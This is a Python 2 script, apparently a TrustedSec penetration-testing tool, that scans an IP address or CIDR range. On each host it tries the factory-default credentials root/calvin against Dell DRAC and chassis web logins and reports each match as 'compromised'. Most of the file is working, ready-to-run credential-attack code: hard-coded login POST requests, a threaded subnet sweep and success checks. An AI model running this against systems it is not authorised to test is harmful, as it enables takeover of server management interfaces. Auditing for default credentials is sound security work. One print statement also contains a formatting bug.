#!/usr/bin/env python
###########################################
#
# Dell DRAC and Chassis Scanner 
# Default Credential Check
# UN: root PW: calvin
#
# Written by Dave Kennedy (ReL1K)
# Company: TrustedSec, LLC
# Website: https://www.trustedsec.com
# @TrustedSec
#
##########################################
import urllib
import urllib2
import re
import threading
import sys
import time

# try to pull a command line argument
try: ipaddr = sys.argv[1]

# if not print this back to user
except IndexError:
	print "\n"
	print "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
	print "DellDRAC and Dell Chassis Discovery and Brute Forcer v0.1a"
	print "Written by Dave Kennedy @ TrustedSec"
	print "https://www.trustedsec.com"
	print "@TrustedSec and @HackingDave"
	print "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
	print ""
	print "Example: python delldrac.py 10.1.1.1/24"
	print ""
	print "python delldrac.py <ipaddress/cidr>\n"
	# exit out
	sys.exit()

# try logging into DRAC, chassis is something different
def login_drac(ipaddr_single):
	# default post string
	url = "https://%s/Applications/dellUI/RPC/WEBSES/create.asp" % (ipaddr_single)
	# post parameters
	opts = {
		  "WEBVAR_PASSWORD": "calvin",
		  "WEBVAR_USERNAME": "root",
		  "WEBVAR_ISCMCLOGIN": 0
		}
	# URL encode it
	data = urllib.urlencode(opts)
	# our headers to pass (taken from raw post)
	headers = {
		# "Host": "10.245.196.52",
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:14.0) Gecko/20100101 Firefox/14.0.1",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-us,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
		"Connection": "keep-alive",
		"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
		"Referer": "https://%s/Applications/dellUI/login.htm" % (ipaddr_single),
		"Content-Length": 63,
		"Cookie": "test=1; SessionLang=EN",
		"Pragma": "no-cache",
		"Cache-Control": "no-cache"

		}
	# request the page
	req = urllib2.Request(url, data, headers)
	try:
		# capture the response
		response = urllib2.urlopen(req, timeout=2)
		data = response.read()
		# if we failed our login, just pass through
		if "Failure_Login_IPMI_Then_LDAP" in data:
			pass 
		# Failure_No_Free_Slot means there are no sessions available need to log someone off
		if "Failure_No_Free_Slot" in data:
			print "[!] There are to many people logged but un: root and pw: calvin are legit on IP: " % (ipaddr_single)
                        global global_check1
                        global_check1 = 1
                       
		# if we are presented with a username back, we are golden
		if "'USERNAME' : 'root'" in data:
			print "[*] Dell DRAC compromised! username: root and password: calvin for IP address: " + ipaddr_single
                        global global_check2
			global_check2 = 1
	# handle failed attempts and move on
	except: pass

# these are for the centralized dell chassis
def login_chassis(ipaddr_single):
	# our post URL
        url = "https://%s/cgi-bin/webcgi/login" % (ipaddr_single)
	# our post parameters
        opts = {
                  "WEBSERVER_timeout": "1800",
                  "user": "root",
                  "password": "calvin",
                  "WEBSERVER_timeout_select": "1800"
                }
	# url encode
        data = urllib.urlencode(opts)
	# headers (taken from raw POST)
        headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:14.0) Gecko/20100101 Firefox/14.0.1",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-us,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Referer": "https://%s/cgi-bin/webcgi/login" % (ipaddr_single),
                "Content-Length": 78
                }
        # request the page
        req = urllib2.Request(url, data, headers)
        try:
		# capture the response
                response = urllib2.urlopen(req, timeout=2)
                data = response.read()
		# if we failed to login
                if "login_failed_hr_top" in data:
                        pass # login failed
		# to many people logged in at a given time
                if 'Connection refused, maximum sessions already in use.' in data:
                        print "[!] There are to many people logged but un: root and pw: calvin are legit on IP: " + (ipaddr_single)
                        global global_check3
			global_check3 = 1

		# successful guess of passwords
                if "/cgi-bin/webcgi/index" in data:
                        print "[*] Dell Chassis Compromised! username: root password: calvin for IP address: " + ipaddr_single
                        global global_check4
			global_check4 = 1

	# except and move on for failed login attempts
        except: pass

# this will check to see if we are using
# a valid IP address for scanning
def is_valid_ip(ip):
    pattern = re.compile(r"""
        ^
        (?:
          # Dotted variants:
          (?:
            # Decimal 1-255 (no leading 0's)
            [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
          |
            0x0*[0-9a-f]{1,2}  # Hexadecimal 0x0 - 0xFF (possible leading 0's)
          |
            0+[1-3]?[0-7]{0,2} # Octal 0 - 0377 (possible leading 0's)
          )
          (?:                  # Repeat 0-3 times, separated by a dot
            \.
            (?:
              [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
            |
              0x0*[0-9a-f]{1,2}
            |
              0+[1-3]?[0-7]{0,2}
            )
          ){0,3}
        |
          0x0*[0-9a-f]{1,8}    # Hexadecimal notation, 0x0 - 0xffffffff
        |
          0+[0-3]?[0-7]{0,10}  # Octal notation, 0 - 037777777777
        |
          # Decimal notation, 1-4294967295:
          429496729[0-5]|42949672[0-8]\d|4294967[01]\d\d|429496[0-6]\d{3}|
          42949[0-5]\d{4}|4294[0-8]\d{5}|429[0-3]\d{6}|42[0-8]\d{7}|
          4[01]\d{8}|[1-3]\d{0,9}|[4-9]\d{0,8}
        )
        $
    """, re.VERBOSE | re.IGNORECASE)
    return pattern.match(ip) is not None

# convert to 32 bit binary from standard format
def ip2bin(ip):
    b = ""
    inQuads = ip.split(".")
    outQuads = 4
    for q in inQuads:
        if q != "":
            b += dec2bin(int(q),8)
            outQuads -= 1
    while outQuads > 0:
        b += "00000000"
        outQuads -= 1
    return b

# decimal to binary conversion
def dec2bin(n,d=None):
    s = ""
    while n>0:
        if n&1:
            s = "1"+s
        else:
            s = "0"+s
        n >>= 1
    if d is not None:
        while len(s)<d:
            s = "0"+s
    if s == "": s = "0"
    return s

# convert a binary string into an IP address
def bin2ip(b):
    ip = ""
    for i in range(0,len(b),8):
        ip += str(int(b[i:i+8],2))+"."
    return ip[:-1]

# print a list of IP addresses based on the CIDR block specified
def scan(ipaddr):
	if "/" in ipaddr:
    		parts = ipaddr.split("/")
    		baseIP = ip2bin(parts[0])
    		subnet = int(parts[1])
    		if subnet == 32:
        		ipaddr = bin2ip(baseIP)
		else:
			# our base ip addresses for how many we are going to be scanning
			counter = 0
			# capture the threads
			threads = []
    		    	ipPrefix = baseIP[:-(32-subnet)]
        		for i in range(2**(32-subnet)):
            	    			ipaddr_single = bin2ip(ipPrefix+dec2bin(i, (32-subnet)))
					# if we are valid proceed
					ip_check = is_valid_ip(ipaddr_single)
					if ip_check != False:
						# do this to limit how fast it can scan, anything more causes CPU to hose
						if counter > 255:
							# put a small delay in place
							time.sleep(0.1)
						# increase counter until 255 then delay 0.1
						counter = counter + 1
						# start our drac BF
						thread = threading.Thread(target=login_drac, args=(ipaddr_single,))
						# create a list of our threads in a dictionary
						threads.append(thread)
						# start the thread
						thread.start()
						# same as above just on the chassis
						thread = threading.Thread(target=login_chassis, args=(ipaddr_single,))
						# append the thread
						threads.append(thread)
						# start the thread
						thread.start()

			# wait for all the threads to terminate
			for thread in threads:
				thread.join()

	# if we are using a single IP address then just do this
	if not "/" in ipaddr:
		login_drac(ipaddr)
		login_chassis(ipaddr)


print "[*] Scanning IP addresses, this could take a few minutes depending on how large the subnet range..."
print "[*] As an example, a /16 can take an hour or two.. A slash 24 is only a couple seconds. Be patient."

# set global variables to see if we were successful
global_check1 = 0
global_check2 = 0
global_check3 = 0
global_check4 = 0

# kick off the scan
scan(ipaddr)

if global_check1 or global_check2 or global_check3 or global_check4 == 1:
        print "[*] DellDrac / Chassis Brute Forcer has finished scanning. Happy Hunting =)"
else:
        print "[!] Sorry, unable to find any of the Dell servers with default creds..Good luck :("
